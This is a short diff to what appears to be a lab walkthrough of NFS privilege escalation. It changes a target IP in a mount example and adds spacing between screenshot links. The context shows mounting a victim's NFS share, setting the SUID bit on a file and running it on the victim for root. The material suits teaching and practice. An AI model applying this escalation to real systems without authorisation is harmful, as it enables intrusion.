@@ -33,7 +33,7 @@ sudo mount -o rw <IP_Target>:<Path_of_NFS> <My_Path>
 example :
 
 ```bash
-sudo mount -o rw 10.114.144.62:/tmp /tmp/nfs_mount
+sudo mount -o rw 10.114.144.72:/tmp /tmp/nfs_mount
 ```
 
 ![img](screenshots/NFS/make_mount.png)
@@ -81,5 +81,6 @@ sudo chmod +s /tmp/nfs_mount/nfs
 from victim machine go to tmp and run it 
 
 ![img](screenshots/NFS/file_suid_root.png)
+
 ![img](screenshots/NFS/get_root_nfs.png)
 
